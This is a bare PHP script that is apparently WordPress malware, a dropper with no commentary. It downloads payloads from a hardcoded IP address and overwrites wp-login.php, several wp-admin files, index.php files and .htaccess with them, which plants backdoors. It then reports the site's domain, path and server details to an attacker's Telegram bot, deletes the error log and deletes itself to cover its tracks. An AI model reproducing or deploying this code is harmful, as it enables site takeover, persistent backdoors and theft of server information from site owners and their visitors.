<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$filedir = "../../../";
$filenames = "/wp-admin/setup-config.php";
$check =$filedir.$filenames;
$text = http_get('161.35.121.12/404.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$filedir = "../../../";
$filenames = "/wp-login.php";
$check =$filedir.$filenames;
$text = http_get('161.35.121.12/404.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$filedir = "../../../";
$filenames = "/wp-includes/ID3/index.php";
$check =$filedir.$filenames;
$text = http_get('http://161.35.121.12/admin.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$filedir = "../../../";
$filenames = "/wp-admin/maint/index.php";
$check =$filedir.$filenames;
$text = http_get('http://161.35.121.12/elp.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$filedir = "../../../";
$filenames = "/wp-admin/radio.php";
$check =$filedir.$filenames;
$text = http_get('http://161.35.121.12/admin.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$filedir = "../../../";
$filenames = "/wp-admin/plugin-install.php";
$check =$filedir.$filenames;
$text = http_get('161.35.121.12/404.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$filedir = "../../../";
$filenames = ".htaccess";
$check =$filedir.$filenames;
$text = http_get('161.35.121.12/htaccess.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/.htaccess" ;
$text = http_get('http://161.35.121.12/htaccess.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
echo '<center><h1>GOGOGOGGOOOOO8889</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] '; system('rm error_log'); $sys = php_uname(); $lihat = getcwd(); $home = $_SERVER['DOCUMENT_ROOT']; $domen = $_SERVER['SERVER_NAME']; $tempat = $_SERVER['REQUEST_URI']; $apiToken = "1522731867:AAHdtsErHFGWOXhIVCfzMhz8xxUWKiH96Hs"; $data = [ 'chat_id' => '1179830888', 'text' => "DASH WORKER : \r\n http://$domen/$tempat \r\n $sys \r\n $home  \n$passpost " ]; $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
unlink('error_log');
unlink(__FILE__);